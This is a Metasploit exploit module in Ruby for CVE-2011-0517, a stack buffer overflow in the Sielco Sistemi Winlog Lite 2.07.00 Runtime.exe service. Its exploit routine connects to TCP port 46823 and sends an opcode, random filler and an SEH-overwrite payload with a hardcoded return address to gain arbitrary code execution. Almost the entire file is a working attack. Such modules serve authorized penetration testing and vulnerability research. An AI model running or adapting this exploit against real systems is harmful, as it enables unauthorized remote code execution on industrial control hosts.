# $Id: winlog_runtime.rb 13000 2011-06-21 22:42:53Z swtornio $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Remote::Seh
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Sielco Sistemi Winlog Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow in Sielco
                Sistem Winlog <= 2.07.00. When sending a specially formatted
                packet to the Runtime.exe service, an attacker may be able to
                execute arbitrary code.
            },
            &#039;Author&#039;         => [ &#039;Luigi Auriemma&#039;, &#039;MC&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: 13000 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-0517&#039; ],
                    [ &#039;OSVDB&#039;, &#039;70418&#039;],
                    [ &#039;URL&#039;, &#039;http://aluigi.org/adv/winlog_1-adv.txt&#039; ],
                ],
            &#039;Privileged&#039;     => false,
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 450,
                    &#039;BadChars&#039; => "\x00\x20\x0a\x0d",
                    &#039;StackAdjustment&#039; => -3500,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Winlog Lite 2.07.00&#039;, { &#039;Ret&#039; => 0x011946de } ],
                ],
            &#039;DefaultTarget&#039; => 0,
            &#039;DisclosureDate&#039; => &#039;Jan 13 2011&#039;))
 
        register_options([Opt::RPORT(46823)], self.class)
    end
 
    def exploit
 
        connect
 
        data =  [0x02].pack(&#039;C&#039;) # opcode
        data << [0x0101].pack(&#039;n&#039;)
        data << rand_text_alpha_upper(588)
        data << generate_seh_payload(target.ret)
 
        print_status("Trying target #{target.name}...")
        sock.put(data)
 
        handler
        disconnect
 
    end
 
end



